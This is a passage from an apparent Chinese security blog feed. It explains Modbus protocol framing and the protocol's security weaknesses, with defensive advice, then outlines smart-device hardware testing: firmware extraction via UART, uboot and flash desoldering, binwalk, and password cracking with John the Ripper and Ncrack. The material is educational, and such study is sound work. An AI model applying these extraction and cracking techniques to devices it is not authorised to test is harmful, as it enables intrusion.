title="数据位"></a>数据位</h3><p>这是衡量通信中实际数据位的参数。当计算机发送一个信息包，实际的数据不会是8位的，标准的值是5、7和8位。如何设置取决于你想传送的信息。比如，标准的ASCII码是0～127（7位）。扩展的ASCII码是0～255（8位）。如果数据使用简单的文本（标准 ASCII码），那么每个数据包使用7位数据。每个包是指一个字节，包括开始/停止位，数据位和奇偶校验位。由于实际数据位取决于通信协议的选取，术语“包”指任何通信的情况。 </p><h3 id="停止位"><a href="#停止位" class="headerlink" title="停止位"></a>停止位</h3><p>用于表示单个包的最后一位。典型的值为1，1.5和2位。由于数据是在传输线上定时的，并且每一个设备有其自己的时钟，很可能在通信中两台设备间出现了小小的不同步。因此停止位不仅仅是表示传输的结束，并且提供计算机校正时钟同步的机会。适用于停止位的位数越多，不同时钟同步的容忍程度越大，但是数据传输率同时也越慢。 </p><h3 id="奇偶校验位"><a href="#奇偶校验位" class="headerlink" title="奇偶校验位"></a>奇偶校验位</h3><p>在串口通信中一种简单的检错方式。有四种检错方式：偶、奇、高和低。当然没有校验位也是可以的。对于偶和奇校验的情况，串口会设置校验位（数据位后面的一位），用一个值确保传输的数据有偶个或者奇个逻辑高位。例如，如果数据是011，那么对于偶校验，校验位为0，保证逻辑高的位数是偶数个。如果是奇校验，校验位位1，这样就有3个逻辑高位。高位和低位不真正的检查数据，简单置位逻辑高或者逻辑低校验。这样使得接收设备能够知道一个位的状态，有机会判断是否有噪声干扰了通信或者是否传输和接收数据是否不同步。<br><img src="\images\pasted-188.png" alt="upload successful"><br><br><br></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>早在1971年，Modicon公司首次推出了Modbus协议，ModbusRTU和Modbus ASCII诞生于此。后来施耐德电气（SchneiderElectric）收购了Modicon公司，并在1997年推出了ModbusTCP协议。2004年，中国国家标准委员会正式把Modbus作为了国家标准，开启了Modbus为中国工业通信做贡献的时代。<br>通过此协议，控制器相互之间、控制器经由网络和其它设备之间可以通信。Modbus协议具有标准、开放，可以支持多种电气接口，数据帧格式简单紧凑，数据传输量大、实时性好等特点，在工业控制系统中得到了广泛的应用，已经成为通用工业标准。深入分析Modbus协议实现原理和其安全性对提高工控系统安全性有着重要的现实意义。ModbusRTU和ModbusASCII主要用于串行通信领域，而ModbusTCP则常用于以太网通信。现在，Modbus已经成为工业领域通信协议标准，并且现在是工业电子设备之间相当常用的连接方式。<br><img src="\images\pasted-181.png" alt="upload successful"><br><br><br></p><h1 id="协议原理"><a href="#协议原理" class="headerlink" title="协议原理"></a>协议原理</h1><p>Modbus使用一种简单的MasterandSlave主从协议（客户机/服务器协议）进行通信。客户机作为主站，向服务器发送请求；服务器（从站）接到请求后，对请求进行分析并作出应答。其中使用的通信帧被称为应用数据单元（Application Data Unit，ADU），它包括通信地址段、功能代码段、数据段和校验段，如下图：<br><img src="\images\pasted-182.png" alt="upload successful"><br>一般使用上，监控系统(HMI)都为Master，PLC、电表、仪表等都为Slave，HMI系统一直PollingSlave的各种relayandregister最新数值，然后做显示及各种逻辑计算及控制调整等处理。<br>其中，功能代码段和数据段组合称为协议数据单元（Protocol Data Unit or Protocol Description Unit)，PDU）。功能代码段占用一个字节，取值范围为1~255，其中128~255为保留值，用于异常消息应答报文。1~127为功能代码编号，其中65~72和100~110为用户自定义编码，具体请看下面这张图片：<br><br><br><br></p><h1 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h1><p>Modbus 协议是一种应用层报文传输协议，包括ASCII、ＲTU、TCP三种报文类型，协议本身并没有定义物理层，只是定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。<br>Modbus 协议使用串口传输时可以选择ＲTU或ASCII模式，并规定了消息、数据结构、命令和应答方式并需要对数据进行校验。ASCII 模式采用LＲC校验，ＲTU模式采用16 位CＲC校验。通过以太网传输时使用TCP，这种模式不使用校验，因为TCP协议是一个面向连接的可靠协议。<br><br><br><br></p><h1 id="Modbus-RTU和Modbus-ASCII有什么区别？"><a href="#Modbus-RTU和Modbus-ASCII有什么区别？" class="headerlink" title="Modbus RTU和Modbus ASCII有什么区别？"></a>Modbus RTU和Modbus ASCII有什么区别？</h1><p>Modbus是一种应用层协议，它定义了与基础网络无关的数据单元（ADU），可以在以太网（TCP/IP）或串行链路上（RS232、RS485等）进行通信（以太网ADU和串行ADU略有不同）。在串行链路上，Modbus协议有两种传输模式——ASCII模式和RTU模式。其中，ASCII是英文“American Standard Code for Information Interchange”的缩写，中文翻译为“美国国家信息交换标准编码”；RTU是英文“ Remote Terminal Unit”的缩写，中文翻译为“远程终端设备”。  </p><h2 id="Modbus的工作原理"><a href="#Modbus的工作原理" class="headerlink" title="Modbus的工作原理"></a>Modbus的工作原理</h2><p>Modbus采用主从（Master-Salve）通信模式，仅有主设备（Master）能对传输进行初始化，从设备（Slave）根据主设备的请求进行应答。典型的主设备包括现场仪表和显示面板，典型的从设备为可编程逻辑控制器（PLC）。<br>在串行链路的主从通信中，Modbus主设备可以连接一个或N（最大为247）个从设备，主从设备之间的通信包括单播模式和广播模式。<br>在广播模式中，Modbus主设备可同时向多个从设备发送请求（设备地址0用于广播模式），从设备对广播请求不进行响应。<br>在单播模式中，主设备发送请求至某个特定的从设备（每个Modbus从设备具有唯一地址），请求的消息帧中会包含功能代码和数据，比如功能代码“01”用来读取离散量线圈的状态。从设备接到请求后，进行应答并把消息反馈主设备。<br><img src="\images\pasted-183.png" alt="upload successful"></p><h2 id="两种模式"><a href="#两种模式" class="headerlink" title="两种模式"></a>两种模式</h2><p><strong><em>在主从设备的通信中，可以使用ASCII模式或者RTU模式。</em></strong><br>在ASCII（AmericanStandard Code for Information Interchange）传输模式下，消息帧以英文冒号（“：”，ASCII3A Hex）开始，以回车和换号（CRLF，ASCII 0D and 0A Hex）符号结束，允许的传输的字符集为十六进制的0~9和A~F；网络中的从设备监视传输通路上是否有英文冒号（“：”），如果有的话，就对消息帧进行解码，查看消息中的地址是否与自己的地址相同，如果相同的话，就接收其中的数据；如果不同的话，则不予理会。<br><img src="\images\pasted-184.png" alt="upload successful"><br>在ASCII模式下，每个8位的字节被拆分成两个ASCII字符进行发送，比如十六进制数0xAF ,会被分解成ASCII字符“A”和“F”进行发送，发送的字符量比RTU增加一倍。ASCII模式的好处是允许两个字符之间间隔的时间长达1s而不引发通信故障，该模式采用纵向冗余校验（Longitudinal Redundancy Check ，LRC)） 的方法来检验错误，当控制器设为在Modbus 网络上以ＲTU 模式通信，消息中的每个8Bit 字节都包含两个4 Bit 的十六进制字符，这种模式没有开始和结束标记。其优点是: 在同样的波特率下，可比传送更多的数据。<br>在RTU（RemoteTerminal Unit）模式下，每个字节可以传输两个十六进制字符，比如十六进制数0xAF，直接以十六进制0xAF（二进制：10101111）进行发送，因此它的发送密度比ASCII模式高一倍；RTU模式采用循环冗余校验（CRC），下面是对RTU模式的总结：<br>具体格式如图 所示。<br><img src="\images\pasted-185.png" alt="upload successful"></p><h2 id="MODBUS-ASCII和RTU两种模式的区别、优缺点"><a href="#MODBUS-ASCII和RTU两种模式的区别、优缺点" class="headerlink" title="MODBUS ASCII和RTU两种模式的区别、优缺点"></a>MODBUS ASCII和RTU两种模式的区别、优缺点</h2><p>下表是MODBUS ASCII协议和RTU协议的比较： </p><table><thead><tr><th>协议</th><th>开始标记</th><th>结束标记</th><th>校验</th><th>传输效率</th><th>程序处理</th></tr></thead><tbody><tr><td>ASCII</td><td>:（冒号）</td><td>CR,LF</td><td>LRC</td><td>低</td><td>直观，简单，易调试</td></tr><tr><td>RTU</td><td>无</td><td>无</td><td>CRC</td><td>高</td><td>稍复杂</td></tr></tbody></table><p>　　从上表的比较我们可以看到，MODBUS的ASCII协议和RTU协议相比，MODBUS ASCII协议拥有开始和结束标记，而MODBUS RTU却没有，所以ASCII协议的程序中对数据包的处理能更加方便。MODBUS ASCII协议的DATA域传输的都是可见的ASCII字符，因此在调试阶段就显得更加直观，另外它的LRC校验程序也比较容易编写，这些都是MODBUS ASCII的优点。MODBUS ASCII的主要缺点是传输效率低，因为它传输的都是可见的ASCII字符，原来用RTU传输的数据每一个字节，用ASCII的话都要把这个字节拆分两个字节，比如RTU传输一个十六进制数0xF9，ASCII就需要传输字符’F’和字符’9’，对应的ASCII码0x46和0x39两个字节，这样它的传输的效率肯定就比RTU低。所以一般来说，如果所需要传输的数据量较小可以考虑使用ASCII协议，如果所需传输的数据量比较大，最好能使用RTU协议。<br>　　另外，由于ASCII协议有开始标志和结束标志，所以一个数据包之间的各字节间的传输间隔时间可以大于1秒，而MODBUS RTU方式下，由于没有规定开始和结束标记，所以协议规定每两个字节之间发送或者接收的时间间隔不能超过3.5倍字符传输时间。如果两个字符时间间隔超过了3.5倍的字符传输时间，就认为一帧数据已经接收，新的一帧数据传输开始，所以RTU方式下两个字节间传输间隔有时间要求。MODBUS 的ASCII和RTU两种协议的这一区别可能决定某些应用场合只能选用其中一种协议。</p><p><br><br></p><h1 id="MODBUS-TCP注意点"><a href="#MODBUS-TCP注意点" class="headerlink" title="MODBUS TCP注意点"></a>MODBUS TCP注意点</h1><h2 id="主机和从机、服务端和客户端"><a href="#主机和从机、服务端和客户端" class="headerlink" title="主机和从机、服务端和客户端"></a>主机和从机、服务端和客户端</h2><h3 id="【在modbus协议中】"><a href="#【在modbus协议中】" class="headerlink" title="【在modbus协议中】"></a>【在modbus协议中】</h3><p>主机发送modbus请求，从机根据请求内容向主机返回响应。在modbus协议中，主机总是主动方，从机总是被动方。</p><h3 id="【在网络应用中】"><a href="#【在网络应用中】" class="headerlink" title="【在网络应用中】"></a>【在网络应用中】</h3><p>在网络应用中存在客户端和服务器端，客户端（例如浏览器）发送请求到服务器，服务器向客户端返回内容（例如HTML文本）。</p><h3 id="【在modbus-tcp中】"><a href="#【在modbus-tcp中】" class="headerlink" title="【在modbus tcp中】"></a>【在modbus tcp中】</h3><p>主机是客户端，而从机是服务器端。千万不要以为服务器端重要，主机也重要，所以主机就是服务器端。</p><h2 id="是否可以多主机"><a href="#是否可以多主机" class="headerlink" title="是否可以多主机"></a>是否可以多主机</h2><p>通过前面的分析，主机为客户端那么modbustcp支持多个主机，在一个局域网中可存在多个主机和多个从机。从机的连接能力（连接主机的数量）由uIP的最大TCP连接个数决定。</p><h2 id="modbus-TCP协议简述"><a href="#modbus-TCP协议简述" class="headerlink" title="modbus TCP协议简述"></a>modbus TCP协议简述</h2><p>modbus TCP和modbus RTU基本相同，但是也存在一些区别<br>a.从机地址变得不再重要，多数情况下忽略。从某种意义上说从机地址被IP地址取代<br>b.CRC校验变得不再重要，甚至可以忽略。由于TCP数据包中已经存在校验，为了不重复造轮子，modbus TCP干脆取消了CRC校验。<br>TCP 模式是为了让Modbus 数据顺利在以太网上传输产生的，使用TCP502 端口。该协议物理层，数据链路层，网络层，传输层都是基于TCP 协议，只在应用层，将Modbus 协议修改后封装进去; 接收端将该TCP 数据包拆封后，重新获得原始Modbus 帧，然后按照Modbus 协议规范进行解析，并将返回的数据包重新封装进TCP 协议中，返回到发送端。与串行链路传输的数据格式不同，TCP 模式去除了附加地址和校验，增加了报文头，其具体格式如下图所示。<br><img src="\images\pasted-186.png" alt="upload successful"><br><strong><em>在modbus TCP中包含一个MBAP头，该头包含以下几个部分</em></strong></p><table><thead><tr><th>区域</th><th>长度</th><th>描述</th><th>客户端</th><th>服务器</th></tr></thead><tbody><tr><td>传输标志</td><td>2字节</td><td>MODBUS 请求和响应传输过程中序列号</td><td>客户端生成</td><td>应答时复制该值</td></tr><tr><td>协议标志</td><td>2字节</td><td>Modbus协议默认为0</td><td>客户端生成</td><td>应答时复制该值</td></tr><tr><td>长度</td><td>2字节</td><td>剩余部分的长度</td><td>客户端生成</td><td>应答时由服务器端生成</td></tr><tr><td>单元标志</td><td>1字节</td><td>从机标志（从机地址）</td><td>客户端生成</td><td>应答时复制该值</td></tr></tbody></table><ul><li>【注意】</li><li>【1】传输标志可理解为序列号，防止 MODBUS TCP通信错位，例如后发生的响应先到了主机，而早发生的响应后到主机</li><li>【2】单元标志可理解为从机地址，此时已经不再重要</li></ul><h2 id="modbus-tcp-和-TCP-IP的关系"><a href="#modbus-tcp-和-TCP-IP的关系" class="headerlink" title="modbus tcp 和 TCP IP的关系"></a>modbus tcp 和 TCP IP的关系</h2><p>modbus TCP可以理解为发生在TCP上的应用层协议，既然是TCP协议那么一个完整的MODBUSTCP报文必然包括TCP首部，IP首部和Ethernet首部。<br><br><br><br></p><h1 id="功能码作用"><a href="#功能码作用" class="headerlink" title="功能码作用"></a>功能码作用</h1><p>启动Modbus事务处理的客户机创建Modbus应用数据单元。功能码（PDU中的）向服务器指示将执行哪种操作。<br>用一个字节编码Modbus数据单元的功能码域。有效范围是十制制1-255（128-255为异常响应保留）。当从客户机向服务器发送报文时，功能码域通过服务器执行哪种操作。<br>从客户机向服务器发送的报文数据域包括附加信息，服务器使用这个信息执行功能码定义的操作。这个域还包括离散项目和寄存器地址、处理项目的数量以及域中的实际数据字节数。<br>在某种请求中，数据域可以是不存在的，在此情况下服务器不需要任何附加信息。功能码仅说明操作。  </p><h2 id="功能码的类型"><a href="#功能码的类型" class="headerlink" title="功能码的类型"></a>功能码的类型</h2><p>功能码主要分为有效功能码、异常功能码和错误功能码。<br>如果在一个正确接收Modbus ADU中，不出现与请求Modbus功能有关的差错，那么服务器至客户机的响应数据会包含请求中的正常功能码。如果出现与请求Modbus功能有关的差错，那么响应数据会包含一个异常码和错误码。<br>例如，客户机能够读一组离散量输出或输入的开/关状态，或者用户能够读/写一组寄存器数据内容。当服务器对客户机响应时，它使用功能码域来指示正常（无差错）响应或出现某种差错（称为异常响应）。对于一个正常响应来说，服务器仅对原始功能码响应，<br>对于异常响应，服务器返回一个与客户机等同的码，设置该原始功能码的最高有效位为逻辑1，并加该异常码后增加错误码，以通知客户机异常原因。</p><h2 id="有效功能码"><a href="#有效功能码" class="headerlink" title="有效功能码"></a>有效功能码</h2><p>有效功能码有二十几种，但是一般使用上都以1、2、3、4、5、6、15、16等八种最为常用，以及另外特殊使用的20、21两种，此为General Reference Register，绝大部份的Modbus设备并不会提供此Register。于PLC上主要的控制数据有下列四种型式。此八种功能码就是处理这些控制资料，详细说明如下各点：</p><h2 id="控制数据四种型式"><a href="#控制数据四种型式" class="headerlink" title="控制数据四种型式"></a>控制数据四种型式</h2><p><strong><em>DI：DigitalInput</em></strong> （数字输入，离散输入），一个地址一个数据位，用户只能读取它的状态，不能修改。以一个 bit表示 On/Off，用来记录控制信号的状态输入，例如：开关，接触点，马达运转，超限switch…等等。于PLC上被称为Input relay、input coil等。<br><strong><em>DO：DigitalOutput</em></strong>（数字输出，线圈输出），一个地址一个数据位，用户可以置位、复位，可以回读状态。以一个 bit表示 On/Off，用来输出控制信号，以激活或停止马达，警铃，灯光…等等。于PLC上被称为Output relay、Output coil等。<br><strong><em>AI：Analog Input</em></strong>（模拟输入，输入寄存器），一个地址16位数据，用户只能读，不能修改，，以16 bits integer表示一个数值，用来记录控制信号的数值输入，例如：温度、流量、料量、速度、转速、文件板开度、液位、重量…等等。于PLC上被称为Input register。<br><strong><em>AO：AnalogOutput</em></strong>（模拟输出，保持寄存器），一个地址16位数据，用户可以写，也可以回读，以16 bits integer表示一个数值，用来输出控制信号的数值，例如：温度、流量、速度、转速、文件板开度、饲料量…等等设定值。于PLC上被称为Output register、Holding register。<br><img src="\images\pasted-187.png" alt="upload successful"><br><br><br></p><h1 id="Modbus-协议安全性分析"><a href="#Modbus-协议安全性分析" class="headerlink" title="Modbus 协议安全性分析"></a>Modbus 协议安全性分析</h1><p>Modbus 协议是典型的工控网协议，研究其安全性对于加强工业控制网络的安全性有重要意义。一般来说，协议安全性问题可以分为两种，一种是协议自身的设计和描述引起的安全问题; 另一种是协议的不正确实现引起的安全问题。Modbus 协议也存在着这两方面的问题。</p><h2 id="Modbus-协议的固有问题"><a href="#Modbus-协议的固有问题" class="headerlink" title="Modbus 协议的固有问题"></a>Modbus 协议的固有问题</h2><p>绝大多数工控协议在设计之初，仅仅考虑了功能实现、提高效率、提高可靠性等方面，而没考虑过安全性问题。Modbus 协议也不例外，尽管其已经成为事实上的工业标准。从前面原理分析可以看出其本身的安全性问题是: 缺乏认证、授权、加密等安全防护机制和功能码滥用问题。  </p><h3 id="缺乏认证"><a href="#缺乏认证" class="headerlink" title="缺乏认证"></a>缺乏认证</h3><p>认证的目的是保证收到的信息来自合法的用户，未认证用户向设备发送控制命令不会被执行。在Modbus 协议通信过程中，没有任何认证方面的相关定义，攻击者只需要找到一个合法的地址就可以使用功能码就能建立一个Modbus 通信会话，从而扰乱整个或者部分控制过程。</p><h3 id="缺乏授权"><a href="#缺乏授权" class="headerlink" title="缺乏授权"></a>缺乏授权</h3><p>授权是保证不同的特权操作需要由拥有不同权限的认证用户来完成，这样可大大降低误操作与内部攻击的概率。目前，Modbus 协议没有基于角色的访问控制机制，也没有对用户分类，没有对用户的权限进行划分，这会导致任意用户可以执行任意功能。</p><h3 id="缺乏加密"><a href="#缺乏加密" class="headerlink" title="缺乏加密"></a>缺乏加密</h3><p>加密可以保证通信过程中双方的信息不被第三方非法获取。Modbus 协议通信过程中，地址和命令全部采用明文传输，因此数据可以很容易的被攻击者<br>捕获和解析，为攻击者提供便利。</p><h3 id="功能码滥用"><a href="#功能码滥用" class="headerlink" title="功能码滥用"></a>功能码滥用</h3><p>功能码是Modbus 协议中的一项重要内容，几乎所有的通信都包含功能码。目前，功能码滥用是导致Modbus 网络异常的一个主要因素。<strong><em>例如不合法报文长度，短周期的无用命令，不正确的报文长度，确认异常代码延迟等都有可能导致拒绝服务攻击。</em></strong></p><h2 id="协议实现产生的问题"><a href="#协议实现产生的问题" class="headerlink" title="协议实现产生的问题"></a>协议实现产生的问题</h2><p>虽然Modbus 协议获得了广泛的应用，但是在实现具体的工业控制系统时，开发者并不具备安全知识或者没有意识到安全问题。这样就导致了使用Modbus 协议的系统中可能存在各种各样的安全漏洞。</p><h3 id="设计安全问题"><a href="#设计安全问题" class="headerlink" title="设计安全问题"></a>设计安全问题</h3><p>Modbus 系统开发者重点关注的是其功能实现问题，安全问题在设计时很少被注意到。设计安全是指设计时充分考虑安全性，解决Modbus 系统可能出现的各种异常和非法操作等问题。比如在通信过程中，某个节点被恶意控制后发出非法数据，就需要考虑这些数据的判别和处理问题。</p><h3 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h3><p>缓冲区溢出是指在向缓冲区内填充数据时超过了缓冲区本身的容量导致溢出的数据覆盖在合法数据上，这是在软件开发中最常见也是非常危险的漏洞，可以导致系统崩溃，或者被攻击者利用来控制系统。Modbus 系统开发者大多不具备安全开发知识，这样就会产生很多的缓冲区溢出漏洞，一旦被恶意者利用会导致严重的后果。</p><h3 id="Modbus-TCP-安全问题"><a href="#Modbus-TCP-安全问题" class="headerlink" title="Modbus TCP 安全问题"></a>Modbus TCP 安全问题</h3><p>目前，Modbus 协议已经可以在通用计算机和通用操作系统上实现，运行于TCP /IP 之上以满足发展需要。这样，TCP /IP 协议自身存在的安全问题不可避免地会影响到工控网络安全。非法网络数据获取，中间人，拒绝服务， IP 欺骗，病毒木马等在IP 互联网中的常用攻击手段都会影响Modbus 系统安全。</p><h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><p>目前，Modbus 系统采取的安全防护措施普遍不足，这里参考信息安全业内研究并结合工控系统自身的安全问题，提出了一些安全建议，能够有效地降低工业控制系统面临的威胁。</p><h3 id="从源头开始"><a href="#从源头开始" class="headerlink" title="从源头开始"></a>从源头开始</h3><p>工控网络漏洞，很大一部分是其实现过程出现的漏洞。如果从源头开始控制，从Modbus 系统的需求设计、开发实现、内部测试和部署等阶段，全生命周期的介入安全手段，融入安全设计、安全编码以及安全测试等技术，可以极大地消除安全漏洞，降低整个Modbus 系统的安全风险。</p><h3 id="异常行为检测"><a href="#异常行为检测" class="headerlink" title="异常行为检测"></a>异常行为检测</h3><p>异常行为代表着可能发生威胁，不管是有没有攻击者，因此开发针对Modbus 系统的专用异常行为检测设备可以极大提高工控网络的安全性。针对Modbus 系统，首先要分析其存在的各种操作行为，依据“主体，地点，时间，访问方式，操作，客体”等行为描述成一个六元组模型; 进而分析其行为是否属于异常; 最终决定采取记录或者报警等措施。</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><p>Modbus 的安全审计就是对协议数据进行深度解码分析，记录操作的时间、地点、操作者和操作行为等关键信息，实现对Modbus 系统的安全审计日志记录和审计功能，从而提供安全事件爆发后的时候追查能力。</p><h3 id="使用网络安全设备"><a href="#使用网络安全设备" class="headerlink" title="使用网络安全设备"></a>使用网络安全设备</h3><p>使用入侵防御和防火墙等网络安全设备。防火墙是一个串行设备，通过设置，只允许特定的地址访问服务端，禁止外部地址访问Modbus 服务器，可以有效的防止外部入侵; 入侵防御设备可以分析Modbus协议的具体操作内容，有效地检测并阻止来自内部/外部的异常操作和各种渗透攻击行为，对内网提供保护功能。<br><br><br><br><br>PS：本篇文章转载自<a href="http://www.freebuf.com/articles/ics-articles/148637.html" target="_blank" rel="noopener">FREEBUF</a></p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ICS </tag>
            
            <tag> modbus </tag>
            
            <tag> 工控协议 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>智能设备硬件安全测试</title>
      <link href="/2018/08/02/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2018/08/02/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
      <content type="html"><![CDATA[<h1 id="智能设备的组成"><a href="#智能设备的组成" class="headerlink" title="智能设备的组成"></a>智能设备的组成</h1><ul><li>CPU: X86/ARM/MIPS/PPC等  </li><li>内存: SDRAM/RAM  </li><li>存储: Flash/TF卡/SD卡/MMC卡/硬盘  </li><li>串口: 一般电路板会留，做调试用网口: 智能设备联网  </li><li>USB口: 接U盘做扩展存储用、也可接键盘和鼠标等  </li><li>无线接口: Wifi/蓝牙/ZigeBee等  </li><li>bootLoader: Uboot等  </li><li>操作系统: Linux/RT-Linux/VxWorks/uCOS-I<br><br><br><br></li></ul><h1 id="智能硬件设备测试简要流程"><a href="#智能硬件设备测试简要流程" class="headerlink" title="智能硬件设备测试简要流程"></a>智能硬件设备测试简要流程</h1><p>1、获取固件<br>2、逆向固件<br>3、分析固件漏洞/调试固件/Fuzz漏洞<br>4、漏洞验证(这一步要有硬件)<br>5、完成测试文档<br><br><br><br></p><h1 id="智能设备固件获取方法"><a href="#智能设备固件获取方法" class="headerlink" title="智能设备固件获取方法"></a>智能设备固件获取方法</h1><p>1、官网或联系售后索取升级包<br>2、在线升级, 抓包获取下载地址<br>3、逆向升级软件,软件内置解包和通讯算法<br>4、从硬件调试接口:JTAG/SWD, 利用调试工具的任意地址读取功能<br>5、拆Flash、Sd卡、TF卡、硬盘等,用编程器或对应设备读固件<br>6、用硬件电路的调试串口和固件的bootloader获取固件<br>7、通过利用网页和通讯漏洞获取固件敏感信息<br>8、用逻辑分析仪监听flash,ram获取信息<br>9、从串口进入系统后,用tar、nc、dd、echo、vi等命令提取<br><img src="\images\pasted-174.png" alt="upload successful"><br><br><br></p><h2 id="拆Flash后-用编程器获取固件"><a href="#拆Flash后-用编程器获取固件" class="headerlink" title="拆Flash后,用编程器获取固件"></a>拆Flash后,用编程器获取固件</h2><p>只需要三步, 但对大部分人很困难:<br>(1)焊下flash芯片<br>(2)用编程器提取固件内容<br>(3)把FLASH芯片焊回电路板<br><img src="\images\pasted-175.png" alt="upload successful"><br><img src="\images\pasted-176.png" alt="upload successful"><br><br><br></p><h2 id="从串口-UART-调试口获取固件"><a href="#从串口-UART-调试口获取固件" class="headerlink" title="从串口(UART)调试口获取固件"></a>从串口(UART)调试口获取固件</h2><ul><li>前提: 开发板上有串口调试接，需要我们找出隐藏的串口。  </li><li>串口按照电压有两种标准：RS232标准和TTL标准</li><li>RS232标准： 电压范围：-12V，+12V （负逻辑）</li><li>TTL标准： 电压范围：0，5V</li><li>串口引脚识别方法: 串口一般有4个引脚</li><li>VCC：电源电压为3.3V 或 5V</li><li>GND：电源电压地</li><li>RXD：数据接收引脚，万用表测电压为低（如硬件上拉可为高）</li><li>TXD：数据发送引脚，万用表测电压一般为高</li><li>试验: 用万用表找串口<br><br><br></li></ul><h2 id="从串口进入系统"><a href="#从串口进入系统" class="headerlink" title="从串口进入系统"></a>从串口进入系统</h2><ul><li>SecureCRT的使用</li><li>通过开发留下的串口, 进入系统</li><li>尝试运行系统的调试命令</li><li>学习串口日志的记录和回看方法<br><br><br></li></ul><h2 id="从串口uboot提取固件流程"><a href="#从串口uboot提取固件流程" class="headerlink" title="从串口uboot提取固件流程"></a>从串口uboot提取固件流程</h2><p>(1)获取flash固件信息<br>(2)用md命令提取固件信息<br>(3)记录串口输出信息<br>(4)分析输出信息,获取固件<br><br><br></p><h2 id="uboot提取固件-md命令"><a href="#uboot提取固件-md命令" class="headerlink" title="uboot提取固件: md命令"></a>uboot提取固件: md命令</h2><p>md - memory display (显示内存RAM/SDRAM内容)<br>用法: md 起始地址 长度 （地址和长度为十六进制格式）<br>思考: md 命令是否能提取固件？ 怎么提取固件呢？<br>可以先把flash中的内容拷贝到内存，再从内存打印<br><br><br><br></p><h1 id="固件提取技术"><a href="#固件提取技术" class="headerlink" title="固件提取技术"></a>固件提取技术</h1><p><img src="\images\pasted-177.png" alt="upload successful"><br><img src="\images\pasted-178.png" alt="upload successful"><br><img src="\images\pasted-179.png" alt="upload successful"></p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><p>提取文件命令：binwalk -e firmware.bin<br>命令：binwalk -Me firmware.bin<br>命令：binwalk -Me firmware.bin<br>命令：binwalk -Me -d 5 firmware.bin<br><br><br></p><h2 id="IDA-pro"><a href="#IDA-pro" class="headerlink" title="IDA pro"></a>IDA pro</h2><p>IDA Pro（简称IDA）是一款交互式反汇编工具<br>IDA最主要的特性是交互和多处理器<br>IDA支持的文件类型非常丰富除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台文件格式。<br><br><br></p><h2 id="retdec"><a href="#retdec" class="headerlink" title="retdec"></a>retdec</h2><p>反编译器不限于任何特定的目标架构，操作系统或可执行文件格式：<br>支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX和原始机器码。<br>支持的体系结构（仅限32b）：Intel x86，ARM，MIPS，PIC32和Power<br><br><br></p><h2 id="敏感信息收集工具Firmwalker"><a href="#敏感信息收集工具Firmwalker" class="headerlink" title="敏感信息收集工具Firmwalker"></a>敏感信息收集工具Firmwalker</h2><p>Firmwalker是一个非常棒的固件分析入手工具，能够帮您找到感兴趣的文件，以便进行更深入的分析<br><br><br><br></p><h1 id="固件的弱密码"><a href="#固件的弱密码" class="headerlink" title="固件的弱密码"></a>固件的弱密码</h1><h2 id="Linux密码文件"><a href="#Linux密码文件" class="headerlink" title="Linux密码文件"></a>Linux密码文件</h2><p>/etc/passwd 密码的前两位是”盐”值，是一个随机数，后面跟的是加密的密码<br>/etc/shadow 只有root可读<br><br><br></p><h2 id="etc-passwd文件简介"><a href="#etc-passwd文件简介" class="headerlink" title="/etc/passwd文件简介"></a>/etc/passwd文件简介</h2><p>adm拥有账号文件，起始目录/var/adm通常包括日志文件<br>bin拥有用户命令的可执行文件<br>daemon用来执行系统守护进程<br>games用来玩游戏<br>halt用来执行halt命令<br>lp拥有打印机后台打印文件<br>mail拥有与邮件相关的进程和文件<br>news拥有与usenet相关的进程和文件<br>nobody被NFS（网络文件系统）使用<br>shutdown执行shutdown命令<br>sync执行sync命令<br>uucp拥有uucp工具和文件<br><br><br></p><h2 id="实用破解法：社工字典法"><a href="#实用破解法：社工字典法" class="headerlink" title="实用破解法：社工字典法"></a>实用破解法：社工字典法</h2><ul><li>John the Ripper（john-1.8.0）<br>John是一款快速密码破解工具，目前支持Unix,Windows,DOS,BeOS和OpenVMS<br>主要目的是用于发现Unix弱密码另外支持许多密码hash类型，如unix系统、windows的LM<br>hash等<br><img src="\images\pasted-180.png" alt="upload successful"><br><br><br></li></ul><h1 id="固件漏洞挖掘"><a href="#固件漏洞挖掘" class="headerlink" title="固件漏洞挖掘"></a>固件漏洞挖掘</h1><p>Ncrack是一个高速的网络认证破解工具，它可以帮助企业测试所有的网络主机和网络设备的密码强度，提高企业网络的安全性。安全专业人员也可使用 Ncrack做渗透测试。<br>Ncrack支持windows和linux系统，并且可以测试暴力破解测试，支持的协议包括RDP、 SSH、 HTTP(s)、 SMB、POP3(s)、 VNC、 FTP, SIP、 Redis、 PostgreSQL、MySQL 以及Telnet。  </p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ICS </tag>
            
            <tag> 固件分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>5_Django高级</title>
      <link href="/2018/07/31/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/"/>
      <url>/2018/07/31/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5/</url>
